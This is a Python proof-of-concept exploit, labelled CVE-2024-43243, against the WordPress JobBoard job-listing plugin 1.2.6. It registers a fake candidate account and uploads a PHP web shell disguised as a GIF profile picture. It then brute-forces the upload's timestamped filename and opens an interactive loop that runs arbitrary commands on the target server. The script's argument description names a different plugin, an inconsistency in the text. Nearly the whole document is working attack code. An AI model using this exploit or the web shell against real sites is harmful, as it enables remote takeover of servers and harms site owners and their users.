"""
CVE-2024-43243

Plugin Name: JobBoard Job listing plugin
Plugin URL: https://wordpress.org/plugins/job-board-light/
Plugin Version: 1.2.6

by: ardias
"""
import requests
import argparse
import random
import pytz
from bs4 import BeautifulSoup
from datetime import datetime

def get_nonce(domain):
    url = f'{domain}/registration'
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', {'name': '_wpnonce'})
        if nonce_input:
            nonce_value = nonce_input.get('value')
            return nonce_value
        else:
            print("Nonce not found.")
    else:
        print("[-] Is register endpoint correct?")

def register_shell(domain, nonce):
    url = f'{domain}/registration/?package_id=0&payment_gateway=paypal&iv-submit-listing=register'
    rand = random.randint(0, 1000)

    # Shell goes here
    files = {
        'profilepicture': ('shell.php', b'GIF89a;\n<?= `$_GET[0]` ?>', 'application/x-php'),
    }

    data = {
        'user_type': 'candidate',
        'iv_member_user_name': f'ardias{rand}',
        'iv_member_email': f'owned{rand}@gmail.com',
        '_wpnonce': nonce,
        '_wp_http_referer': '',
        'iv_member_password': 'ardias123',
        'reg_error': 'yes',
        'package_id': '0',
        'return_page': '',
        'submit_jobboard_payment': '',
        'hidden_form_name': 'jobboard_registration',
    }

    # Timezone WP by default is UTC
    utc_timezone = pytz.UTC
    local_timezone = pytz.timezone('UTC') 

    # date('YmdHis');
    start_exc = datetime.now(utc_timezone).astimezone(local_timezone).strftime('%Y%m%d%H%M%S')
    r = requests.post(url, data=data, files=files, allow_redirects=False)
    finish_exc = datetime.now(utc_timezone).astimezone(local_timezone).strftime('%Y%m%d%H%M%S')

    if r.status_code == 302 and 'set-cookie' in r.headers:
        print("[+] Shell Uploaded")
        return start_exc, finish_exc
    else:
        print("[-] Failed")

def brute_filename(domain, start_exc, finish_exc):
    dif = int(finish_exc) - int(start_exc)

    for i in range(dif + 1):
        brute_filename = str(int(start_exc) + i) + 'shell.php'
        full_url = f"{domain}/wp-content/uploads/{brute_filename}"
        r = requests.get(full_url)
        if r.status_code == 200:
            print(f"[+] FOUND: {full_url}")
            return full_url
    if r.status_code != 200:
        print("[-] Not found, it seems like the server timezone is different.")

def execute_command(shell_url, command):
    response = requests.get(f"{shell_url}?0={command}")
    if response.status_code == 200:
        print(f"\n{response.text}")
    else:
        exit

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Sage Ai Content Writer PoC Arbitrary File Upload')
    parser.add_argument('domain', type=str, help='The target domain (e.g., http://example.com)')

    args = parser.parse_args()

    nonce = get_nonce(args.domain)
    start,finish = register_shell(args.domain, nonce)
    print("[i] Search Valid URL")
    valid_url = brute_filename(args.domain, start, finish)

    if valid_url:
        while True:
            command = input("[Command] > ")
            if command.lower() in ["exit", "quit"]:
                print("Exiting...")
                break
            execute_command(valid_url, command)